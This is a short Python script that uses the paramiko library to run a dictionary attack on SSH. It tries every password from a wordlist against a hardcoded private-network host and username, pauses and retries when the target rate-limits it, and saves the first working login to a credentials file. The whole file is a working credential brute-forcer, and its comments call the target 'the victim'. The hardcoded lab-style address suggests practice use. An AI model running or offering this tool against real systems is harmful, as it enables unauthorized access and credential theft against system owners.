import paramiko
import socket
import time
import argparse

def is_ssh_open(hostname, username, password):
    # initialize SSH client usi
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)

    except socket.timeout:  # when the host is unreachable during the 3 seconds timeout.
        print(f"[!] Host: {hostname} is unreachable, timed out")
        return False
    except paramiko.AuthenticationException: # when the username and password combination is incorrect.
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:  # the victim entered cooldown...
        print(f"[*] Quota exceeded, retrying with delay...")
        time.sleep(60)
        return is_ssh_open(hostname, username, password) #recursion
    else:
        # connection was established successfully!!!
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True


# main function:
def dictattack(passlist, username, host_ip):
    # read the password word file,
    fd = open(passlist)
    passlist1 = fd.read().splitlines()
    # brute-force
    for password in passlist1:
        if is_ssh_open(host_ip, username, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{username}@{host_ip}:{password}")
            break
    fd.close()
    
    
dictattack("/home/shlomi/dic.txt", "schorot", "10.1.0.138")